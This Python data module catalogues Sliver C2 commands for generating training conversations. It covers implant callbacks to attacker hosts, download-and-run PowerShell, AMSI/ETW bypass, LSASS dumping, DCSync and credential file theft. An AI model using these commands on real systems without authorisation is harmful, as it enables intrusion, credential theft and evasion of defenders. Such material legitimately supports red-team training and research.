#!/usr/bin/env python3
"""
Comprehensive Sliver C2 Command Knowledge Base.

This module contains structured documentation for ALL major Sliver commands,
organized by category. Used by generate_conversations.py to create training data.

Categories:
- Listeners (C2 infrastructure)
- Implant Generation
- Session/Beacon Management
- Post-Exploitation
- Credential Access
- Lateral Movement
- Pivoting & Tunneling
- Evasion
- Persistence
- File Operations
- Process Manipulation
- Network Reconnaissance
- Armory Extensions

Reference: Sliver v1.6.x (https://github.com/BishopFox/sliver)
"""

# =============================================================================
# LISTENERS - C2 Infrastructure
# =============================================================================

LISTENER_COMMANDS = {
    "mtls": {
        "category": "listener",
        "description": "Start an mTLS (mutual TLS) listener",
        "syntax": "mtls [--lhost <host>] [--lport <port>] [--persistent]",
        "examples": [
            "mtls",
            "mtls --lport 8888",
            "mtls --lhost 10.0.0.1 --lport 443",
            "mtls --lport 8888 --persistent",
        ],
        "explanation": """mTLS (mutual TLS) is Sliver's most secure C2 channel. Both the server and implant authenticate using certificates, preventing MITM attacks and making traffic analysis difficult.

Key options:
- `--lhost`: Interface to bind (default: 0.0.0.0)
- `--lport`: Port to listen on (default: 8888)
- `--persistent`: Restart listener on server restart

mTLS is recommended for:
- Internal networks where you control the infrastructure
- Situations where encrypted traffic won't raise alerts
- Long-term operations requiring reliable connections""",
    },
    "http": {
        "category": "listener",
        "description": "Start an HTTP C2 listener",
        "syntax": "http [--lhost <host>] [--lport <port>] [--domain <domain>] [--website <name>]",
        "examples": [
            "http --lport 80",
            "http --lport 8080 --domain updates.example.com",
            "http --lport 80 --website decoy-site",
        ],
        "explanation": """HTTP listeners blend in with normal web traffic but provide no encryption. Use HTTPS instead when possible.

Key options:
- `--lport`: Port to listen on (default: 80)
- `--domain`: Domain for Host header validation
- `--website`: Serve static content alongside C2
- `--long-poll-timeout`: Timeout for long-polling (default: 1s)

HTTP is useful for:
- Bypassing firewalls that only allow port 80
- Testing in lab environments
- Staging before switching to encrypted channels""",
    },
    "https": {
        "category": "listener",
        "description": "Start an HTTPS C2 listener",
        "syntax": "https [--lhost <host>] [--lport <port>] [--domain <domain>] [--acme] [--cert <path>] [--key <path>]",
        "examples": [
            "https --lport 443",
            "https --lport 443 --domain cdn.example.com --acme",
            "https --lport 443 --cert /path/to/cert.pem --key /path/to/key.pem",
        ],
        "explanation": """HTTPS listeners provide encrypted C2 over standard TLS, blending with normal web traffic.

Key options:
- `--domain`: Domain name (required for ACME)
- `--acme`: Auto-provision Let's Encrypt certificate
- `--cert`/`--key`: Use custom certificate
- `--website`: Serve decoy website content

HTTPS is ideal for:
- Evading network inspection
- Blending with legitimate HTTPS traffic
- Operations where the target can reach the internet""",
    },
    "dns": {
        "category": "listener",
        "description": "Start a DNS C2 listener",
        "syntax": "dns [--domains <domain1,domain2>] [--lport <port>] [--no-canaries]",
        "examples": [
            "dns --domains c2.example.com",
            "dns --domains ns1.evil.com,ns2.evil.com --lport 53",
            "dns --domains implant.evil.com --no-canaries",
        ],
        "explanation": """DNS C2 encodes commands in DNS queries, which often bypasses firewalls since DNS is rarely blocked.

Key options:
- `--domains`: C2 domains (you must control the DNS)
- `--canaries`: Enable canary domain detection
- `--lport`: Port (default 53, requires root)
- `--no-canaries`: Disable canary detection

DNS C2 is slower but excellent for:
- Bypassing strict egress filtering
- Air-gapped networks with DNS allowed
- Very stealthy long-term persistence

Requires DNS infrastructure setup (NS records pointing to your server).""",
    },
    "wg": {
        "category": "listener",
        "description": "Start a WireGuard C2 listener",
        "syntax": "wg [--lport <port>] [--nport <port>] [--key-port <port>]",
        "examples": [
            "wg",
            "wg --lport 53",
            "wg --lport 443 --nport 8888",
        ],
        "explanation": """WireGuard listeners create a VPN tunnel for C2 communication, providing full IP-level connectivity.

Key options:
- `--lport`: WireGuard listen port (default: 53)
- `--nport`: Virtual network port
- `--key-port`: Key exchange port

WireGuard C2 advantages:
- Full TCP/IP connectivity through the tunnel
- Very fast and efficient protocol
- Good for pivoting and tunneling
- Can masquerade on common ports (53, 443)""",
    },
    "jobs": {
        "category": "listener",
        "description": "List active listeners and background jobs",
        "syntax": "jobs [--kill <id>] [--kill-all]",
        "examples": [
            "jobs",
            "jobs --kill 1",
            "jobs -K",
        ],
        "explanation": """The jobs command shows all active listeners and background tasks.

Output includes:
- Job ID
- Name (listener type)
- Protocol
- Port
- Description

Use `jobs --kill <id>` to stop a specific listener.
Use `jobs -K` or `--kill-all` to stop all listeners.""",
    },
}

# =============================================================================
# IMPLANT GENERATION
# =============================================================================

IMPLANT_COMMANDS = {
    "generate": {
        "category": "implant",
        "description": "Generate a new Sliver implant",
        "syntax": "generate [beacon] [--os <os>] [--arch <arch>] [--mtls <url>] [--http <url>] [--https <url>] [--dns <domain>] [--format <format>] [--save <path>]",
        "examples": [
            "generate --mtls 10.0.0.1:8888",
            "generate --os windows --arch amd64 --mtls 10.0.0.1:8888",
            "generate --os linux --arch amd64 --https attacker.com:443",
            "generate beacon --os windows --mtls 10.0.0.1:8888 --seconds 60 --jitter 30",
            "generate --format shellcode --os windows --mtls 10.0.0.1:8888 --save beacon.bin",
            "generate --os darwin --arch arm64 --mtls 10.0.0.1:8888",
        ],
        "explanation": """Generate creates Sliver implants - standalone executables that connect back to your C2 server.

**Core Options:**
- `--os`: Target OS (windows, linux, darwin)
- `--arch`: CPU architecture (amd64, 386, arm64)
- `--name`: Custom implant name
- `--save`: Save to file path

**C2 Channels (can combine multiple):**
- `--mtls <host:port>`: mTLS callback
- `--http <url>`: HTTP callback  
- `--https <url>`: HTTPS callback
- `--dns <domain>`: DNS callback
- `--wg <host:port>`: WireGuard callback

**Output Formats:**
- `--format exe`: Executable (default)
- `--format shared`: Shared library (DLL/SO)
- `--format shellcode`: Raw shellcode
- `--format service`: Windows service binary

**Beacon Mode (append `beacon` before options):**
- `--seconds <n>`: Check-in interval
- `--jitter <n>`: Randomization percentage (0-100)

**Evasion:**
- `--evasion`: Enable evasion features
- `--debug`: Include debug info (not for production)

Sessions provide real-time interaction; beacons are stealthier with periodic check-ins.""",
    },
    "regenerate": {
        "category": "implant",
        "description": "Regenerate an existing implant configuration",
        "syntax": "regenerate [--save <path>] <implant-name>",
        "examples": [
            "regenerate my-beacon",
            "regenerate my-beacon --save /tmp/new-beacon.exe",
        ],
        "explanation": """Regenerate creates a new implant using an existing configuration.

Useful when:
- Original implant was detected/burned
- Need fresh binary with same settings
- Deploying to additional targets

The regenerated implant has different hashes but identical behavior.""",
    },
    "implants": {
        "category": "implant",
        "description": "List all generated implants",
        "syntax": "implants [--os <os>] [--arch <arch>]",
        "examples": [
            "implants",
            "implants --os windows",
            "implants --arch amd64",
        ],
        "explanation": """Lists all implant configurations that have been generated.

Shows:
- Implant name
- OS and architecture
- C2 protocols configured
- Format (exe, shellcode, etc.)
- Debug status

Use this to track your implant inventory and regenerate as needed.""",
    },
    "profiles": {
        "category": "implant",
        "description": "Manage implant generation profiles",
        "syntax": "profiles [new|rm] [--name <name>] [options...]",
        "examples": [
            "profiles",
            "profiles new --name stealth-win --os windows --arch amd64 --mtls 10.0.0.1:8888 --evasion",
            "profiles new beacon --name long-beacon --os windows --mtls 10.0.0.1:8888 --seconds 3600",
            "profiles rm --name old-profile",
        ],
        "explanation": """Profiles save implant generation configurations for reuse.

**List profiles:**
```
profiles
```

**Create new profile:**
```
profiles new --name <name> [implant options]
profiles new beacon --name <name> [beacon options]
```

**Delete profile:**
```
profiles rm --name <name>
```

**Generate from profile:**
```
generate --profile <name>
```

Profiles are useful for standardizing implant configs across operations.""",
    },
    "stage-listener": {
        "category": "implant",
        "description": "Start a stager listener for staged payloads",
        "syntax": "stage-listener [--url <url>] [--profile <name>]",
        "examples": [
            "stage-listener --url http://10.0.0.1:8080/update.woff --profile stealth-win",
            "stage-listener --url https://cdn.example.com/font.woff2 --profile my-beacon",
        ],
        "explanation": """Stage listeners serve staged payloads - small stagers that download the full implant.

Staged payloads are useful when:
- Initial payload size is restricted
- Using exploits with limited space
- Need to bypass size-based detection

The stager connects to the URL and downloads the full implant.
Use with `generate stager` to create compatible stagers.""",
    },
}

# =============================================================================
# SESSION & BEACON MANAGEMENT
# =============================================================================

SESSION_COMMANDS = {
    "sessions": {
        "category": "session",
        "description": "List active sessions",
        "syntax": "sessions [--kill <id>] [--kill-all] [--filter <field>] [--filter-re <regex>]",
        "examples": [
            "sessions",
            "sessions --kill abc123",
            "sessions -K",
            "sessions --filter hostname --filter-re 'DC.*'",
        ],
        "explanation": """Sessions are real-time, interactive connections to implants.

**List all sessions:**
```
sessions
```

**Kill specific session:**
```
sessions --kill <session-id>
```

**Kill all sessions:**
```
sessions -K
```

**Filter sessions:**
```
sessions --filter <field> --filter-re <regex>
```

Output shows:
- Session ID (first 8 chars usually sufficient)
- Hostname and username
- OS and architecture
- Remote address
- Transport protocol
- Last check-in time""",
    },
    "beacons": {
        "category": "beacon",
        "description": "List active beacons",
        "syntax": "beacons [--kill <id>] [--kill-all] [--filter <field>]",
        "examples": [
            "beacons",
            "beacons --kill xyz789",
            "beacons -K",
        ],
        "explanation": """Beacons are asynchronous implants that check in periodically.

Unlike sessions, beacons:
- Connect at configured intervals (not constantly)
- Queue tasks for next check-in
- Are harder to detect due to intermittent traffic
- Survive network interruptions gracefully

**List beacons:**
```
beacons
```

Shows next check-in time, interval, jitter, and task queue status.

**Interact with beacon:**
```
use <beacon-id>
```

Commands are queued and results return on next check-in.""",
    },
    "use": {
        "category": "interaction",
        "description": "Interact with a session or beacon",
        "syntax": "use <session-id | beacon-id | index>",
        "examples": [
            "use abc12345",
            "use 1",
            "use xyz789",
        ],
        "explanation": """The `use` command selects a session or beacon for interaction.

**By ID (partial match works):**
```
use abc123
```

**By index number:**
```
use 1
```

After selecting, your prompt changes to show the target:
```
sliver (HOSTNAME) >
```

Available commands depend on implant capabilities. Type `help` to see options.

**Return to main menu:**
```
background
```""",
    },
    "background": {
        "category": "interaction",
        "description": "Background the current session/beacon",
        "syntax": "background",
        "examples": [
            "background",
        ],
        "explanation": """Returns to the main Sliver menu without killing the session/beacon.

The implant remains active and can be re-selected with `use`.

Shortcut: Ctrl+Z also backgrounds the current session.""",
    },
    "kill": {
        "category": "interaction",
        "description": "Kill a session or beacon",
        "syntax": "kill [--force]",
        "examples": [
            "kill",
            "kill --force",
        ],
        "explanation": """Terminates the current session or beacon.

**Normal kill:**
```
kill
```
Sends clean termination signal to the implant.

**Force kill:**
```
kill --force
```
Immediately drops the connection without cleanup.

Use force when the implant is unresponsive or you need immediate termination.""",
    },
    "info": {
        "category": "interaction",
        "description": "Get detailed information about current implant",
        "syntax": "info",
        "examples": [
            "info",
        ],
        "explanation": """Displays comprehensive information about the current session/beacon:

- Implant name and ID
- Hostname, username, UID/GID
- OS, architecture, process info
- C2 channel and transport
- First/last check-in times
- Beacon interval (if applicable)
- Active pivots

Use this to understand your access level and plan next steps.""",
    },
}

# =============================================================================
# POST-EXPLOITATION - Basic Commands
# =============================================================================

POST_EXPLOITATION_COMMANDS = {
    "execute": {
        "category": "post",
        "description": "Execute a command on the target",
        "syntax": "execute [-o] [-s] [-t <timeout>] <command> [args...]",
        "examples": [
            "execute whoami",
            "execute -o whoami",
            "execute -o ipconfig /all",
            "execute -o -s cmd.exe /c dir C:\\Users",
            "execute -o /bin/ls -la /etc",
            "execute -t 30 -o ping -c 4 10.0.0.1",
        ],
        "explanation": """Execute runs a program on the target and optionally captures output.

**Key options:**
- `-o, --output`: Capture and return output (REQUIRED to see results)
- `-s, --save`: Save output to loot
- `-t, --timeout`: Timeout in seconds
- `-X, --loot`: Save to loot with name
- `--ppid`: Parent process ID for spoofing
- `--hidden`: Run in hidden window (Windows)

**Examples:**

Windows:
```
execute -o whoami
execute -o cmd.exe /c "dir C:\\Users"
execute -o powershell.exe -c "Get-Process"
```

Linux:
```
execute -o id
execute -o /bin/cat /etc/passwd
execute -o /bin/bash -c "ls -la"
```

Note: For interactive shells, use `shell` instead.""",
    },
    "shell": {
        "category": "post",
        "description": "Get an interactive shell",
        "syntax": "shell [--shell-path <path>] [--no-pty]",
        "examples": [
            "shell",
            "shell --shell-path /bin/zsh",
            "shell --shell-path C:\\Windows\\System32\\cmd.exe",
            "shell --no-pty",
        ],
        "explanation": """Opens an interactive shell on the target.

**Default shells:**
- Windows: cmd.exe
- Linux/macOS: /bin/bash

**Custom shell:**
```
shell --shell-path /bin/zsh
shell --shell-path powershell.exe
```

**Exit shell:**
- Type `exit` or press Ctrl+D

**Notes:**
- Shell traffic goes through C2, so slight latency is normal
- Use `execute` for single commands to avoid shell overhead
- For beacons, shell commands queue until next check-in""",
    },
    "powershell": {
        "category": "post",
        "description": "Execute PowerShell commands (Windows)",
        "syntax": "powershell [--amsi-bypass] [--etw-bypass] <command>",
        "examples": [
            "powershell Get-Process",
            "powershell --amsi-bypass Get-Process",
            "powershell --etw-bypass --amsi-bypass 'IEX (iwr http://10.0.0.1/script.ps1)'",
            "powershell Get-ADUser -Filter * -Properties *",
        ],
        "explanation": """Execute PowerShell commands with optional AMSI/ETW bypass.

**Basic execution:**
```
powershell Get-Process
```

**With AMSI bypass (recommended):**
```
powershell --amsi-bypass Get-MpThreatDetection
```

**With ETW bypass (evade logging):**
```
powershell --etw-bypass Invoke-Mimikatz
```

**Both bypasses:**
```
powershell --amsi-bypass --etw-bypass <command>
```

The AMSI bypass helps evade Windows Defender script scanning.
ETW bypass prevents PowerShell logging to Event Logs.""",
    },
    "upload": {
        "category": "file",
        "description": "Upload a file to the target",
        "syntax": "upload <local-path> <remote-path>",
        "examples": [
            "upload /tools/mimikatz.exe C:\\Windows\\Temp\\m.exe",
            "upload ./linpeas.sh /tmp/lp.sh",
            "upload payloads/beacon.exe 'C:\\Users\\Public\\update.exe'",
        ],
        "explanation": """Upload transfers a file from your system to the target.

**Syntax:**
```
upload <local-path> <remote-path>
```

**Tips:**
- Use absolute paths for reliability
- Quote paths with spaces
- Windows paths need double backslashes or forward slashes
- Check disk space before large uploads

**Windows:**
```
upload ./payload.exe C:\\Windows\\Temp\\svc.exe
upload ./script.ps1 C:/Users/Public/s.ps1
```

**Linux:**
```
upload ./linpeas.sh /tmp/lp.sh
upload ./implant /var/tmp/.cache
```""",
    },
    "download": {
        "category": "file",
        "description": "Download a file from the target",
        "syntax": "download <remote-path> [local-path]",
        "examples": [
            "download /etc/shadow",
            "download /etc/passwd ./loot/passwd",
            "download 'C:\\Users\\admin\\Desktop\\passwords.xlsx'",
            "download C:\\Windows\\NTDS\\ntds.dit ./loot/",
        ],
        "explanation": """Download retrieves a file from the target to your system.

**Basic download (saves to current directory):**
```
download /etc/shadow
```

**Download to specific location:**
```
download /etc/passwd ./loot/passwd
```

**Windows files:**
```
download C:\\Users\\admin\\Desktop\\secret.docx
download 'C:\\Program Files\\App\\config.xml' ./loot/
```

Downloaded files are automatically logged in Sliver's loot system.
Use `loot` command to view all collected files.""",
    },
    "cat": {
        "category": "file",
        "description": "Display file contents",
        "syntax": "cat <remote-path>",
        "examples": [
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat C:\\Users\\admin\\Desktop\\notes.txt",
            "cat /home/user/.ssh/id_rsa",
        ],
        "explanation": """Display the contents of a file on the target without downloading.

**Syntax:**
```
cat <file-path>
```

**Examples:**
```
cat /etc/passwd
cat /etc/hosts
cat C:\\Windows\\System32\\drivers\\etc\\hosts
cat C:\\Users\\admin\\.ssh\\config
```

For binary files or large files, use `download` instead.""",
    },
    "cd": {
        "category": "file",
        "description": "Change working directory",
        "syntax": "cd <path>",
        "examples": [
            "cd /tmp",
            "cd C:\\Users\\admin\\Desktop",
            "cd ..",
            "cd ~",
        ],
        "explanation": """Change the implant's working directory.

**Syntax:**
```
cd <path>
```

**Examples:**
```
cd /var/log
cd C:\\Users\\admin
cd ..
cd /
```

Use `pwd` to show current directory.
Use `ls` to list directory contents.""",
    },
    "pwd": {
        "category": "file",
        "description": "Print working directory",
        "syntax": "pwd",
        "examples": [
            "pwd",
        ],
        "explanation": """Display the implant's current working directory.

**Syntax:**
```
pwd
```

Returns the full path of the current directory.""",
    },
    "ls": {
        "category": "file",
        "description": "List directory contents",
        "syntax": "ls [path]",
        "examples": [
            "ls",
            "ls /etc",
            "ls C:\\Users",
            "ls -la /home",
        ],
        "explanation": """List files and directories.

**Current directory:**
```
ls
```

**Specific path:**
```
ls /var/log
ls C:\\Users\\admin\\Desktop
```

Output shows:
- File/directory name
- Size
- Permissions (Linux)
- Modified time""",
    },
    "mkdir": {
        "category": "file",
        "description": "Create a directory",
        "syntax": "mkdir <path>",
        "examples": [
            "mkdir /tmp/workdir",
            "mkdir C:\\Users\\Public\\cache",
        ],
        "explanation": """Create a new directory on the target.

**Syntax:**
```
mkdir <path>
```

**Examples:**
```
mkdir /tmp/staging
mkdir C:\\Windows\\Temp\\work
```""",
    },
    "rm": {
        "category": "file",
        "description": "Remove a file",
        "syntax": "rm <path>",
        "examples": [
            "rm /tmp/payload.sh",
            "rm C:\\Windows\\Temp\\beacon.exe",
        ],
        "explanation": """Delete a file from the target.

**Syntax:**
```
rm <path>
```

**Caution:** This permanently deletes the file. There is no confirmation prompt.

For directories, the directory must be empty. Use with care on production systems.""",
    },
    "mv": {
        "category": "file",
        "description": "Move or rename a file",
        "syntax": "mv <src> <dst>",
        "examples": [
            "mv /tmp/payload.exe /tmp/svc.exe",
            "mv C:\\Temp\\a.exe C:\\Users\\Public\\b.exe",
        ],
        "explanation": """Move or rename a file on the target.

**Rename:**
```
mv /tmp/beacon.exe /tmp/update.exe
```

**Move to different directory:**
```
mv C:\\Temp\\payload.exe C:\\Users\\Public\\
```""",
    },
    "cp": {
        "category": "file",
        "description": "Copy a file",
        "syntax": "cp <src> <dst>",
        "examples": [
            "cp /etc/passwd /tmp/passwd.bak",
            "cp C:\\Windows\\System32\\config\\SAM C:\\Temp\\SAM.bak",
        ],
        "explanation": """Copy a file on the target.

**Syntax:**
```
cp <source> <destination>
```

**Examples:**
```
cp /etc/shadow /tmp/shadow_copy
cp C:\\Windows\\repair\\SAM C:\\Temp\\
```""",
    },
    "chmod": {
        "category": "file",
        "description": "Change file permissions (Linux/macOS)",
        "syntax": "chmod <mode> <path>",
        "examples": [
            "chmod 755 /tmp/script.sh",
            "chmod 600 /home/user/.ssh/id_rsa",
            "chmod +x /tmp/payload",
        ],
        "explanation": """Change file permissions on Linux/macOS targets.

**Numeric mode:**
```
chmod 755 /tmp/script.sh
chmod 600 ~/.ssh/id_rsa
```

**Symbolic mode:**
```
chmod +x /tmp/payload
chmod u+w /etc/config
```

Common modes:
- 755: rwxr-xr-x (executable)
- 644: rw-r--r-- (readable)
- 600: rw------- (private)""",
    },
    "chown": {
        "category": "file",
        "description": "Change file ownership (Linux/macOS)",
        "syntax": "chown <uid> <gid> <path>",
        "examples": [
            "chown 0 0 /tmp/rootfile",
            "chown 1000 1000 /home/user/file",
        ],
        "explanation": """Change file ownership on Linux/macOS targets.

**Syntax:**
```
chown <uid> <gid> <path>
```

**Examples:**
```
chown 0 0 /tmp/suid_binary      # Change to root:root
chown 1000 1000 /opt/app/data   # Change to user 1000
```

Requires appropriate privileges (usually root).""",
    },
}

# =============================================================================
# PROCESS MANIPULATION
# =============================================================================

PROCESS_COMMANDS = {
    "ps": {
        "category": "process",
        "description": "List running processes",
        "syntax": "ps [-p <pid>] [-o <owner>] [-e <exe>]",
        "examples": [
            "ps",
            "ps -o SYSTEM",
            "ps -o NT AUTHORITY\\SYSTEM",
            "ps -e defender",
            "ps -p 1234",
        ],
        "explanation": """List running processes on the target.

**All processes:**
```
ps
```

**Filter by owner:**
```
ps -o SYSTEM
ps -o root
ps -o 'DOMAIN\\user'
```

**Filter by executable:**
```
ps -e chrome
ps -e defender
```

**Specific PID:**
```
ps -p 1234
```

Output shows:
- PID and PPID
- Owner/user
- Architecture (x86/x64)
- Executable name
- Session ID (Windows)

Useful for:
- Finding security products (AV/EDR)
- Identifying migration targets
- Understanding system state""",
    },
    "procdump": {
        "category": "process",
        "description": "Dump process memory",
        "syntax": "procdump <pid> [--save <path>]",
        "examples": [
            "procdump 1234",
            "procdump 1234 --save /tmp/lsass.dmp",
            "procdump 692",  # LSASS PID
        ],
        "explanation": """Dump memory from a running process.

**Dump to loot:**
```
procdump <pid>
```

**Save to specific file:**
```
procdump <pid> --save ./dump.bin
```

**LSASS dumping for credentials:**
```
ps -e lsass              # Find LSASS PID
procdump <lsass-pid>     # Dump memory
```

The dump can be analyzed offline with tools like Mimikatz:
```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Note: LSASS dumping may trigger EDR alerts.""",
    },
    "terminate": {
        "category": "process",
        "description": "Terminate a process",
        "syntax": "terminate <pid>",
        "examples": [
            "terminate 1234",
            "terminate 4567",
        ],
        "explanation": """Kill a process by PID.

**Syntax:**
```
terminate <pid>
```

**Use cases:**
- Kill security products (if possible)
- Stop competing implants
- Clean up spawned processes

**Caution:** Killing critical processes may crash the system or alert defenders.""",
    },
    "migrate": {
        "category": "process",
        "description": "Migrate implant to another process",
        "syntax": "migrate <pid>",
        "examples": [
            "migrate 1234",
            "migrate 5678",
        ],
        "explanation": """Move the implant into a different process.

**Syntax:**
```
migrate <pid>
```

**Process:**
1. Find target process: `ps`
2. Migrate: `migrate <pid>`

**Good migration targets:**
- Long-running processes (explorer.exe, svchost.exe)
- Processes with network access
- Processes unlikely to be closed

**Benefits:**
- Evade process-based detection
- Gain different access levels
- Survive if original process dies""",
    },
    "execute-assembly": {
        "category": "process",
        "description": "Execute a .NET assembly in-memory",
        "syntax": "execute-assembly [--amsi-bypass] [--etw-bypass] <assembly-path> [args...]",
        "examples": [
            "execute-assembly ./Seatbelt.exe -group=all",
            "execute-assembly --amsi-bypass ./Rubeus.exe kerberoast",
            "execute-assembly ./SharpHound.exe -c All",
            "execute-assembly --amsi-bypass --etw-bypass ./SafetyKatz.exe",
        ],
        "explanation": """Execute a .NET assembly entirely in memory without dropping to disk.

**Basic execution:**
```
execute-assembly ./Seatbelt.exe -group=all
```

**With AMSI bypass:**
```
execute-assembly --amsi-bypass ./Rubeus.exe kerberoast
```

**With ETW bypass (prevent logging):**
```
execute-assembly --etw-bypass ./SharpHound.exe
```

**Common assemblies:**
- Seatbelt.exe - System enumeration
- Rubeus.exe - Kerberos attacks
- SharpHound.exe - BloodHound collection
- SafetyKatz.exe - Credential extraction

Note: Assembly must be on your LOCAL system, not the target.""",
    },
    "sideload": {
        "category": "process",
        "description": "Load and execute a shared library in a sacrificial process",
        "syntax": "sideload [--process <name>] [--export <func>] <dll-path> [args...]",
        "examples": [
            "sideload ./payload.dll",
            "sideload --process notepad.exe ./payload.dll",
            "sideload --export DllMain ./malicious.dll",
        ],
        "explanation": """Spawn a sacrificial process and inject a DLL/shared library.

**Basic sideload:**
```
sideload ./payload.dll
```

**Specify host process:**
```
sideload --process notepad.exe ./payload.dll
```

**Specify export function:**
```
sideload --export MyFunc ./library.dll arg1 arg2
```

Benefits:
- DLL runs in separate process (sacrificial)
- Original implant survives if DLL crashes
- Can use process you control as cover""",
    },
    "spawndll": {
        "category": "process",
        "description": "Spawn a DLL in a new process (Windows)",
        "syntax": "spawndll [--process <name>] [--export <func>] <dll-path> [args...]",
        "examples": [
            "spawndll ./reflective.dll",
            "spawndll --process svchost.exe ./payload.dll",
            "spawndll --export ReflectiveLoader ./payload.dll",
        ],
        "explanation": """Load a reflective DLL in a new sacrificial process.

Similar to sideload but specifically for reflective DLLs that can load themselves without standard loader APIs.

**Syntax:**
```
spawndll [--process <name>] <dll-path>
```

The DLL is loaded reflectively in memory in the spawned process.""",
    },
    "msf": {
        "category": "process",
        "description": "Inject Metasploit shellcode into the current process",
        "syntax": "msf [--pid <pid>] [--payload <payload>] --lhost <ip> --lport <port>",
        "examples": [
            "msf --lhost 10.0.0.1 --lport 4444",
            "msf --payload windows/x64/meterpreter/reverse_tcp --lhost 10.0.0.1 --lport 4444",
            "msf --pid 1234 --lhost 10.0.0.1 --lport 4444",
        ],
        "explanation": """Inject Metasploit shellcode payload into a process.

**Inject into current process:**
```
msf --lhost 10.0.0.1 --lport 4444
```

**Inject into specific process:**
```
msf --pid 1234 --lhost 10.0.0.1 --lport 4444
```

**Specify payload:**
```
msf --payload windows/x64/meterpreter/reverse_https --lhost 10.0.0.1 --lport 443
```

This creates a Metasploit session while maintaining your Sliver implant.
Useful for leveraging Metasploit's extensive post-exploitation modules.""",
    },
}

# =============================================================================
# NETWORK RECONNAISSANCE
# =============================================================================

NETWORK_COMMANDS = {
    "ifconfig": {
        "category": "network",
        "description": "List network interfaces",
        "syntax": "ifconfig",
        "examples": [
            "ifconfig",
        ],
        "explanation": """Display network interface information.

**Syntax:**
```
ifconfig
```

Output shows:
- Interface name
- IP addresses (IPv4 and IPv6)
- MAC address
- MTU

Useful for:
- Understanding network position
- Finding additional network segments
- Identifying potential pivot points""",
    },
    "netstat": {
        "category": "network",
        "description": "List network connections",
        "syntax": "netstat [-T] [-l] [-u] [-4] [-6]",
        "examples": [
            "netstat",
            "netstat -l",
            "netstat -T",
            "netstat -4",
        ],
        "explanation": """Display active network connections.

**All connections:**
```
netstat
```

**Listening only:**
```
netstat -l
```

**TCP only:**
```
netstat -T
```

**UDP only:**
```
netstat -u
```

**IPv4 only:**
```
netstat -4
```

Output shows:
- Protocol
- Local address:port
- Remote address:port
- State (ESTABLISHED, LISTEN, etc.)
- PID (if available)

Useful for:
- Finding internal services
- Identifying connected hosts
- Understanding network topology""",
    },
    "arp": {
        "category": "network",
        "description": "Display ARP cache",
        "syntax": "arp",
        "examples": [
            "arp",
        ],
        "explanation": """Show the ARP (Address Resolution Protocol) cache.

**Syntax:**
```
arp
```

Output shows:
- IP address
- MAC address
- Interface

The ARP cache reveals recently communicated hosts on the local network segment.
Useful for host discovery in local networks.""",
    },
}

# =============================================================================
# CREDENTIAL ACCESS
# =============================================================================

CREDENTIAL_COMMANDS = {
    "hashdump": {
        "category": "credential",
        "description": "Dump password hashes from SAM database",
        "syntax": "hashdump",
        "examples": [
            "hashdump",
        ],
        "explanation": """Dump local account password hashes from the SAM database.

**Syntax:**
```
hashdump
```

**Requirements:**
- SYSTEM privileges on Windows
- Usually requires running as NT AUTHORITY\\SYSTEM

**Output format:**
```
Username:RID:LM-hash:NTLM-hash:::
```

The NTLM hashes can be:
- Cracked offline with hashcat/john
- Used for Pass-the-Hash attacks

Note: Modern Windows doesn't store LM hashes by default (shown as empty).""",
    },
    "dcsync": {
        "category": "credential",
        "description": "DCSync attack to dump domain credentials",
        "syntax": "dcsync [--user <domain\\user>] [--dc <dc-ip>]",
        "examples": [
            "dcsync --user DOMAIN\\Administrator",
            "dcsync --user DOMAIN\\krbtgt",
            "dcsync --user CORP\\Administrator --dc 10.0.0.1",
        ],
        "explanation": """Perform DCSync attack to replicate credentials from a Domain Controller.

**Dump specific user:**
```
dcsync --user DOMAIN\\Administrator
```

**Dump krbtgt (for Golden Ticket):**
```
dcsync --user DOMAIN\\krbtgt
```

**Specify DC:**
```
dcsync --user DOMAIN\\Administrator --dc 192.168.1.1
```

**Requirements:**
- Domain user with replication rights:
  - Domain Admins
  - Enterprise Admins
  - Users with "Replicating Directory Changes All" rights

**Output includes:**
- NTLM hash
- Kerberos keys (AES, DES)
- Password history (if available)""",
    },
}

# =============================================================================
# PIVOTING & TUNNELING
# =============================================================================

PIVOT_COMMANDS = {
    "pivots": {
        "category": "pivot",
        "description": "Manage pivot listeners for lateral implant connections",
        "syntax": "pivots [tcp|named-pipe] [--bind <addr>]",
        "examples": [
            "pivots",
            "pivots tcp --bind 0.0.0.0:9999",
            "pivots named-pipe --pipe-name sliver-pivot",
        ],
        "explanation": """Pivots allow other implants to connect through a compromised host.

**List active pivots:**
```
pivots
```

**Start TCP pivot:**
```
pivots tcp --bind 0.0.0.0:9999
```

**Start named pipe pivot (Windows):**
```
pivots named-pipe --pipe-name my-pivot
```

**Generate implant to use pivot:**
```
generate --tcp-pivot <pivot-ip>:9999
```

Use pivots to:
- Reach segmented networks
- Avoid direct C2 exposure
- Chain through multiple hosts""",
    },
    "portfwd": {
        "category": "pivot",
        "description": "Create port forwards",
        "syntax": "portfwd add [--bind <addr>] --remote <host:port>",
        "examples": [
            "portfwd add --bind 127.0.0.1:3389 --remote 10.0.0.5:3389",
            "portfwd add --bind 0.0.0.0:445 --remote 192.168.1.10:445",
            "portfwd rm --id 1",
            "portfwd",
        ],
        "explanation": """Create TCP port forwards through the implant.

**Add forward:**
```
portfwd add --bind <local-addr:port> --remote <target:port>
```

**Example - Forward RDP:**
```
portfwd add --bind 127.0.0.1:3389 --remote 10.0.0.5:3389
```
Then connect: `rdesktop localhost:3389`

**Example - Forward SMB:**
```
portfwd add --bind 127.0.0.1:445 --remote 192.168.1.10:445
```

**List forwards:**
```
portfwd
```

**Remove forward:**
```
portfwd rm --id <id>
```""",
    },
    "socks5": {
        "category": "pivot",
        "description": "Start a SOCKS5 proxy through the implant",
        "syntax": "socks5 start [--host <host>] [--port <port>]",
        "examples": [
            "socks5 start",
            "socks5 start --port 1080",
            "socks5 start --host 127.0.0.1 --port 9050",
            "socks5 stop",
        ],
        "explanation": """Create a SOCKS5 proxy through the implant for tunneling arbitrary TCP traffic.

**Start SOCKS proxy:**
```
socks5 start
socks5 start --port 1080
```

**Stop proxy:**
```
socks5 stop
```

**Usage:**
Configure tools to use: `socks5://127.0.0.1:<port>`

**Proxychains config:**
```
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```

**Use with tools:**
```
proxychains nmap -sT 10.0.0.0/24
proxychains ssh admin@internal-host
curl --socks5 127.0.0.1:1080 http://internal-app
```

SOCKS5 is ideal for:
- Scanning internal networks
- Accessing internal web apps
- Using tools that don't support proxying natively""",
    },
    "rportfwd": {
